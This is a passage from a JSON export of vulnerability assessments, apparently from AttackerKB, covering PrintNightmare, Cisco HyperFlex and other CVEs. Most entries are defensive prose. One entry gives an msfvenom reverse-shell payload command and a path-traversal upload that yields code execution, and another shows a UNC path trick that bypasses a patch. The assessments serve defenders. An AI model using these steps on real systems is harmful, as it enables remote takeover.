      "document": "Microsoft Edge contains a security feature bypass vulnerability, and a PoC exploit hasn\u2019t been publicly disclosed at this time.\r\n\r\nSource:https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34506",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Defense Evasion"
      },
      "tags": []
    },
    {
      "id": "fe68374c-8795-4053-bc00-79975780cc03",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "c131316a-e2b2-4d96-b8df-7820a2f96238",
      "created": "2021-06-25T08:12:53.9399Z",
      "revisionDate": "2021-06-28T04:38:07.603563Z",
      "document": "This plugin is not that commonly deployed on Wordpress installations and to detected it you need the `aggressive` plugin mode of Wpscan enabled else wpDiscuz won't be even detected.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "dc8368d0-a27f-49f8-9a37-fa1e268dfc30",
      "editorId": "38047d0b-ee12-4823-af3f-dbbd759fa225",
      "topicId": "6d848e58-548b-45be-a600-d0b5780beb50",
      "created": "2021-06-25T12:48:40.052011Z",
      "revisionDate": "2021-06-28T04:37:58.85555Z",
      "document": "Proof of Concept of the XSS attack is publicly available.\r\n\r\nThis is an XSS attack, which doesn't require authentication to plant the code, but it requires user interaction (visit something in web interface) to trigger it.\r\n\r\nOriginal tweet: https://twitter.com/ptswarm/status/1408050644460650502\r\nCopy of tweet (screenshot) and analysis https://www.tenable.com/blog/cve-2020-3580-proof-of-concept-published-for-cisco-asa-flaw-patched-in-october\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "566620f5-de01-430d-a96f-1d674f3ffa9d",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "bdd3015f-0cc0-428f-ac2b-3d914c0ea584",
      "created": "2021-06-25T18:16:15.839833Z",
      "revisionDate": "2021-06-28T04:37:53.594911Z",
      "document": "Security issues have been identified in Citrix Hypervisor 8.2 LTSR, each of which may allow privileged code in a guest VM to cause the host to crash or become unresponsive.  These issues only affect Citrix Hypervisor 8.2 LTSR.\r\n\r\nSource: https://support.citrix.com/article/CTX316325",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution"
      },
      "tags": []
    },
    {
      "id": "2f0db52c-a770-4ec4-a71b-c9e6f2943541",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "6d848e58-548b-45be-a600-d0b5780beb50",
      "created": "2021-06-25T20:24:58.38956Z",
      "revisionDate": "2021-06-25T20:24:58.392585Z",
      "document": "This feels like it could be similar to [CVE-2020-3187](https://attackerkb.com/topics/I02rUjGW1r/cve-2020-3187?referrer=search), which got a lot of attention last summer but was pretty overhyped. Summarizing a few conversations among researchers: This looks like stored XSS, user interaction is required to trigger it (would be a much bigger deal if no interaction were necessary), attacker still needs to go phishing or similar for efficacy. Could be that there's a caveat to those caveats that increases the vuln's value, but until proven otherwise, we're gonna rate this low-to-moderate on the value scale. Definitely a good idea to keep ASAs updated, though, irrespective of the value of any particular bug. H/T to @wvu-r7 and @hrbrmstr for the convo!",
      "score": 1,
      "metadata": {
        "attacker-value": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "4476e15f-9543-48ef-83fe-ea74ebb2552f",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "a85ede41-3f67-480b-8858-46b5d866eb51",
      "created": "2021-06-28T17:32:52.086968Z",
      "revisionDate": "2021-06-28T17:32:52.094212Z",
      "document": " A successful exploit strategy needs to bypass the following security mitigations on the target:\r\n\r\nAddress Space Layout Randomization (ASLR)\r\nData Execution Prevention (DEP)\r\nControl Flow Guard (CFG)\r\nSandbox Bypass\r\n\r\nAlso PoC is available https://github.com/ZeusBox/CVE-2021-21017 ",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e2197b0c-c050-4bc6-bfd8-5ef5f550f302",
      "editorId": "2351954f-610b-421c-8a62-792e9c5e5225",
      "topicId": "2c37da82-6bd9-4e2b-ac6b-d377103952bb",
      "created": "2021-06-28T20:12:38.870393Z",
      "revisionDate": "2021-06-28T20:12:38.869452Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "54e404f1-1598-4628-b9c5-4334bf8d81e8",
      "editorId": "2351954f-610b-421c-8a62-792e9c5e5225",
      "topicId": "aa4eb5ff-67f6-4204-8de7-34c73f01af88",
      "created": "2021-06-28T20:14:19.329328Z",
      "revisionDate": "2021-06-28T20:14:19.333035Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "9a8d3d6a-f0c1-4b72-b318-6cbcfaeaba92",
      "editorId": "2351954f-610b-421c-8a62-792e9c5e5225",
      "topicId": "1b1a131e-51d7-4951-9d90-f23a4ef96028",
      "created": "2021-06-28T20:16:51.009821Z",
      "revisionDate": "2021-06-28T20:16:51.014279Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "53441e0d-5aa3-4079-ba19-d8166bf13811",
      "editorId": "2351954f-610b-421c-8a62-792e9c5e5225",
      "topicId": "c338961c-af6f-4f3b-ba11-b1e927b6a825",
      "created": "2021-06-28T20:19:39.017707Z",
      "revisionDate": "2021-06-29T15:09:43.275Z",
      "document": "Impact is very dependant on your system. No measures were in place on the software level to control resources via processing of activity in the background or was performance taken into consideration so the larger the extension's database the easier for it to fall over. The extension should be updating things in the background as the information it makes available is not instantly required and job runners are less likely to overwhelm the database due to their nature.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b9aff19c-4f62-49b5-a8be-5dc3c683d201",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "cda9c43e-015d-4b04-89d3-d6cabc5729b9",
      "created": "2021-06-29T17:55:55.165668Z",
      "revisionDate": "2021-06-29T17:55:55.17266Z",
      "document": "Proof-of-concept exploit code has been published online today for a vulnerability in the Windows Print Spooler service that can allow a total compromise of Windows systems.\r\n\r\nSource: https://therecord.media/poc-released-for-dangerous-windows-printnightmare-bug/",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "44c5ef6e-114c-4777-b24a-fbe3726f3868",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "1ba7dc74-f17d-4c34-9a6c-2f6b39787aa2",
      "created": "2021-06-29T21:51:53.660033Z",
      "revisionDate": "2021-06-29T21:51:53.669084Z",
      "document": "The Microsoft Exchange team has released  Cumulative Updates (CUs) for Exchange Server 2016 and Exchange Server 2019\r\nhttps://techcommunity.microsoft.com/t5/exchange-team-blog/released-june-2021-quarterly-exchange-updates/ba-p/2459826",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "fb46cf47-cd83-4421-91ec-626c0ccf6603",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "ff495201-9e29-4561-ae45-888e59e30e1b",
      "created": "2021-06-29T22:23:41.753235Z",
      "revisionDate": "2024-04-12T01:45:18.678971Z",
      "document": "Over 20 orgs suffered breaches due to CVE-2021-27101, which affects Accellion FTA. Data has shown up on the Clop ransomware extortion website.\r\nhttps://twitter.com/RecordedFuture/status/1408095974329888771",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e6c6f180-0b75-494a-8f43-6dbef7bb3cf3",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "cda9c43e-015d-4b04-89d3-d6cabc5729b9",
      "created": "2021-06-30T13:53:09.529042Z",
      "revisionDate": "2021-07-07T19:31:06.960238Z",
      "document": "#### Vulnerability\r\nThis was originally classified as a Local Priv Escalation, however recent POC code has been released that enabled a domain authenticated user to remotely escalate to `SYSTEM` on vulnerable services\r\n\r\n#### Exploit Code\r\n\r\nThere are several functional exploits available on Github after the initial repository was removed by the authors. \r\n\r\n- https://github.com/afwu/PrintNightmare - A windows binary exploit\r\n- https://github.com/cube0x0/CVE-2021-1675 - Python3 using a modified version of impacket\r\n\r\n#### Mitigation\r\n\r\nInitial testing shows that the patches released are not sufficient to stop this exploit. It has been tested in Server 2016 and Server 2019. \r\n\r\nDisable the print spooler can prevent exploitation. \r\n\r\nEvent logs can be found for both successful and non-successful exploit attempts in some situations. \r\n\r\nSigma rules can be found: https://github.com/SigmaHQ/sigma/pull/1592\r\n\r\n",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "ec8873d8-3840-409b-8514-90721cb71305",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "77e58eb9-547a-4137-bd9b-c2e5e487fa8e",
      "created": "2021-06-30T14:35:06.224664Z",
      "revisionDate": "2021-07-12T12:42:09.536374Z",
      "document": "Trivial RCE with a one-line request. Rapid7 Labs is seeing this product in quite a few large enterprises\u2014patch quickly. Shout-out to Portswigger for their excellent write-up: https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464\r\n\r\nUpdate July 12, 2021: We now have reliable private reports of exploitation in the wild. ",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "14ac8442-447d-4ae9-9399-ff81588bb8a6",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "cda9c43e-015d-4b04-89d3-d6cabc5729b9",
      "created": "2021-07-01T13:43:51.799901Z",
      "revisionDate": "2021-07-01T13:43:51.806745Z",
      "document": "Rapid7 researchers have confirmed that a fully patched (as of June 2021) Windows Server 2019 is exploitable with at least one of the public exploits. There's still a lot of confusion in the community about what exactly is exploitable and why (e.g., permissions requirements), but don't let the complexity inherent to these researcher conversations convince you NOT to act. Disable the print spooler, quickly. More info: https://www.rapid7.com/blog/post/2021/06/30/cve-2021-1675-printnightmare-patch-does-not-remediate-vulnerability/",
      "score": 1,
      "metadata": {
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "590a6255-a9c8-499a-bcee-45a4e3fd1dd9",
      "editorId": "a84e860b-902e-4786-8670-9ef6df8e8815",
      "topicId": "cda9c43e-015d-4b04-89d3-d6cabc5729b9",
      "created": "2021-07-01T13:46:23.50868Z",
      "revisionDate": "2021-07-07T19:31:11.780992Z",
      "document": "### Vulnerability\r\n\r\nCan be used as LPE and RCE.  Code will run as SYSTEM.\r\n\r\n### Possible temporary mitigations\r\n\r\nPatch for CVE-2021-1675 published on the 08.06.2021 mitigates exploitation if User is not an admin and computer is not a domain controller.\r\n\r\nTo mitigate lateral movement a GPO can be used to disabled connections to spooler RPC service https://github.com/LaresLLC/CVE-2021-1675\r\n\r\nTo mitigate LPE and RCE a ACL for the printer driver can be set https://blog.truesec.com/2021/06/30/fix-for-printnightmare-cve-2021-1675-exploit-to-keep-your-print-servers-running-while-a-patch-is-not-available/\r\n\r\nDisabling the spooler service is also an theoretical option, but might come at a high operational cost.\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "4f8f257f-ade5-4a27-a166-8ff47a566f74",
      "editorId": "10e8f9e5-d601-4b72-819f-99b8ffd860ba",
      "topicId": "cda9c43e-015d-4b04-89d3-d6cabc5729b9",
      "created": "2021-07-02T02:37:25.037889Z",
      "revisionDate": "2021-07-08T21:03:09.275632Z",
      "document": "Microsoft has just assigned a new CVE to PrintNightmare (CVE-2021-34527) and published a security guide about this vulnerability. This guide contains a summay, exploitability, workarounds and a FAQ:\r\n\r\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527\r\n\r\nFuture patches will be released at that address.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "03181c6d-04ba-4fa0-a48d-17a06a5b4dcc",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "0921aaa5-38aa-41a4-b1fa-3b0eda576050",
      "created": "2021-07-06T14:53:05.41905Z",
      "revisionDate": "2021-07-08T21:03:02.196059Z",
      "document": "CVE-2021-1499 is an unauthenticated file upload vulnerability in the Cisco HyperFlex HX Data Platform.\r\n\r\nThe vulnerability can be used to obtain RCE as the Tomcat user. Requests sent to the endpoint `/upload` do not require authentication by default, this allows us to upload a payload. Files sent to the upload endpoint are saved on disk in `/var/www/localhost/images` and are accessible via the endpoint` /images`, which hosts the file. We can\u2019t execute payloads from `/images`\u00a0as it maps to an nginx file server. Luckily the `/upload` endpoint lacks the necessary input sanitization to prevent us from writing anywhere the Tomcat User has write access.\u00a0\r\n\r\nTo obtain RCE first generate a .war payload: `./msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.123.1 LPORT=4444 -f war > crossdomain.xml.war`\r\n\r\nSet the file name to `../../../lib/tomcat7/webapps/crossdomain.xml.war` when uploading and payload will end up in the tomcat web apps directory.  Tomcat is set to hot deploy so it will deploy the malicious payload. We can tell hot deployment is on from line 76 & 77 of `/etc/tomcat7/server.xml`:\r\n```\r\n 76       <Host name=\"localhost\"  appBase=\"webapps\" deployOnStartup=\"true\"\r\n 77             autoDeploy=\"true\" deployXML=\"true\">\r\n```\r\n\r\nWe name the file `crossdomain.xml.war` so when it gets uploaded and deployed the payload can then be accessed via `/crossdomain.xml/<malicious_jspfile.jsp>`. \u00a0\r\n```\r\n\u00a0location /crossdomain.xml\r\n\u00a0\u00a0{\r\n\u00a0\u00a0\u00a0\u00a0auth_basic off;\r\n\u00a0\u00a0\u00a0\u00a0proxy_pass http://localhost:8000;\r\n\u00a0\u00a0\u00a0\u00a0allow all; # Allow all to see content\r\n\u00a0\u00a0}\r\n```\r\nThe above rule in the nginx configuration file, `/etc/nginx/conf.d/springpath.conf` allows requests to be sent to `/crossdomain.xml` without authentication and they get reverse proxied to the Tomcat server. The reverse proxy to Tomcat allows malicious .jsp files to be executed instead served like on the nginx endpoint `/images` .",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3b38173f-042b-4708-8ee8-065f9ce8a23d",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "7575b82f-7b7a-4416-b1aa-b8a2df4d0800",
      "created": "2021-07-08T00:12:03.270084Z",
      "revisionDate": "2021-08-12T18:32:06.931515Z",
      "document": "Critical RCE in the Windows Print Spooler service, with all versions of Windows vulnerable by default, can also be used for LPE. A myriad of public exploits and tools are available to aid in exploitation, and remediation requires the additional step of disabling Point and Print (by setting two registry keys to `0`) after patch application. Without disabling Point and Print, RCE and LPE are still possible via multiple vectors (MS-PAR, MS-RPRN) regardless of patch level. Exploitation detected in the wild, only expected to increase. Patch and disable Point and Print, or else disable Print Spooler altogether. See the [Rapid7 analysis](https://attackerkb.com/topics/MIHLz4sY3s/cve-2021-34527-printnightmare#rapid7-analysis) for more info. \r\n\r\n**Update August 12, 2021:** Crowdstrike is reporting that PrintNightmare is now being incorporated into [Magniber ransomware attacks](https://www.crowdstrike.com/blog/magniber-ransomware-caught-using-printnightmare-vulnerability/) against South Korean organizations. ",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "d5a0b38b-2df2-4067-b694-aa7ea2afdbf5",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "e22d11bc-89f5-42aa-b31b-78d5e22902db",
      "created": "2021-07-08T15:54:46.258533Z",
      "revisionDate": "2021-07-08T16:05:59.995602Z",
      "document": "Please see the [blog post](https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/) for more information. An [exploit](https://github.com/rapid7/metasploit-framework/pull/15400) has been posted. For all intents and purposes, this is unauthenticated RCE. A [patch](https://www.sagecity.com/gb/sage-x3-uk/f/sage-x3-uk-announcements-news-and-alerts/147993/sage-x3-latest-patches) is available.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "dd2cae4f-c2fb-49fa-b4f9-01a2703f9494",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "7575b82f-7b7a-4416-b1aa-b8a2df4d0800",
      "created": "2021-07-08T17:09:17.824694Z",
      "revisionDate": "2022-12-11T18:33:07.067841Z",
      "document": "CVE-2021-34527 is related to the previous CVE-2021-1675. This fixes a vulnerability whereby an authenticated attacker can connect to the remote print service (via either MS-RPRN or MS-PAR) and add a driver using a custom DLL. Upon successful exploitation, the Print Spool service would load the attacker controlled DLL from either a remote UNC path or a local path. In both cases, the DLL is then executed with NT AUTHORITY\\SYSTEM privileges.\r\n\r\nThe patch for CVE-2021-34527 is effective at preventing this attack **only when Point and Print** is disabled, which is the default setting. This can be configured by ensuring the registry key `HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint NoWarningNoElevationOnInstall` is 0. The system does not need to be rebooted to enforce the changed registry key. If that registry key is defined as 1, the vulnerability can still be exploited. With Point and Print enabled, a standard UNC path used over the MS-RPRN vector (via `RpcAddPrinterDriverEx`) will fail with `ERROR_INVALID_PARAMETER`. This can be bypassed by converting the UNC path from the standard syntax (`\\\\1.2.3.4\\public\\payload.dll`) to the alternative syntax (`\\??\\UNC\\1.2.3.4\\public\\payload.dll`).\r\n\r\nWith the patches applied and Point and Print disabled, the affected calls to `RpcAddPrinterDriverEx` will return ERROR_ACCESS_DENIED.",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
